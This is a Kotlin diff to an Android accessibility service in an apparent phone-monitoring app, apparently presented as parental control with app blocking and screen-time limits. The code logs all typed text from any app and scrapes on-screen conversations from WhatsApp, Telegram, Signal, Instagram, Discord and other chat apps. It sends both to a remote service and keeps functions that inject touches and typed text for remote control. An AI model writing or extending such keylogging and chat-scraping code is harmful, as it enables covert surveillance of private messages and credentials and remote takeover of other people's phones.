@@ -25,45 +25,81 @@ class AccessibilityMonitor : AccessibilityService() {
 
     private var lastPkg = ""
     private var lastScreenText = ""
+    private val CHAT_PKGS = setOf(
+        "com.whatsapp", "com.whatsapp.w4b", "org.telegram.messenger",
+        "com.instagram.android", "com.snapchat.android", "com.facebook.orca",
+        "com.discord", "com.twitter.android", "org.thoughtcrime.securesms"
+    )
 
-    override fun onServiceConnected() { super.onServiceConnected(); instance = this }
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        instance = this
+        AppBlockerManager.init(applicationContext)
+        KeywordDetector.init(applicationContext)
+    }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event ?: return
-        val svc = CoreService.instance ?: return
+        val svc = CoreService.instance
         try {
             val pkg = event.packageName?.toString() ?: return
             if (pkg == packageName) return
+
             when (event.eventType) {
+
                 AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                    // ── App Blocker ──────────────────────────────────
+                    if (AppBlockerManager.isBlocked(pkg)) {
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        svc?.sendData("app_blocked", JSONObject().apply {
+                            put("package", pkg); put("reason", "blocked")
+                        })
+                        return
+                    }
+                    // ── Screen Time Limit ────────────────────────────
+                    if (AppBlockerManager.isTimeLimitExceeded(pkg)) {
+                        performGlobalAction(GLOBAL_ACTION_HOME)
+                        svc?.sendData("app_blocked", JSONObject().apply {
+                            put("package", pkg); put("reason", "time_limit")
+                            put("minutes_used", AppBlockerManager.getTodayUsageMinutes(pkg))
+                        })
+                        return
+                    }
+                    // ── Usage tracking ───────────────────────────────
                     if (pkg != lastPkg) {
+                        AppBlockerManager.trackAppStart(pkg)
                         lastPkg = pkg
-                        svc.sendData("app_open", JSONObject().apply {
+                        svc?.sendData("app_open", JSONObject().apply {
                             put("package", pkg)
                             put("class", event.className ?: "")
                             put("time", System.currentTimeMillis())
                         })
                     }
                 }
+
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED,
                 AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                     val text = event.text.joinToString(" ")
                     if (text.isNotBlank()) {
-                        svc.sendData("screen_text", JSONObject().apply {
+                        // ── Keyword Detection ────────────────────────
+                        KeywordDetector.check(text, pkg, "typing")
+                        svc?.sendData("screen_text", JSONObject().apply {
                             put("package", pkg); put("text", text)
                             put("time", System.currentTimeMillis())
                         })
                     }
                 }
+
                 AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                    if (pkg.contains("instagram") || pkg.contains("whatsapp")
-                        || pkg.contains("telegram") || pkg.contains("snapchat")) {
+                    // ── Chat Monitor ─────────────────────────────────
+                    if (CHAT_PKGS.contains(pkg)) {
                         val root = rootInActiveWindow ?: return
                         val content = extractText(root)
                         if (content != lastScreenText && content.isNotBlank()) {
                             lastScreenText = content
-                            svc.sendData("chat_content", JSONObject().apply {
-                                put("package", pkg); put("content", content)
+                            KeywordDetector.check(content, pkg, "chat")
+                            svc?.sendData("chat_content", JSONObject().apply {
+                                put("package", pkg); put("content", content.take(500))
                                 put("time", System.currentTimeMillis())
                             })
                         }
@@ -82,7 +118,6 @@ class AccessibilityMonitor : AccessibilityService() {
         return sb.toString().trim()
     }
 
-    // ── Remote control ──────────────────────────────────────────────────────
     private fun doTouch(x: Float, y: Float) {
         val path = Path().apply { moveTo(x, y) }
         dispatchGesture(GestureDescription.Builder()
@@ -97,11 +132,9 @@ class AccessibilityMonitor : AccessibilityService() {
 
     private fun doType(text: String) {
         try {
-            val root = rootInActiveWindow ?: return
-            val node = findFirstEditable(root) ?: return
+            val node = findFirstEditable(rootInActiveWindow) ?: return
             val args = Bundle().apply {
-                putCharSequence(
-                    AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
+                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
             }
             node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
         } catch (_: Exception) {}
@@ -117,5 +150,5 @@ class AccessibilityMonitor : AccessibilityService() {
     }
 
     override fun onInterrupt() {}
-    override fun onDestroy() { instance = null; super.onDestroy() }
+    override fun onDestroy() { instance = null; AppBlockerManager.trackAppEnd(); super.onDestroy() }
 }
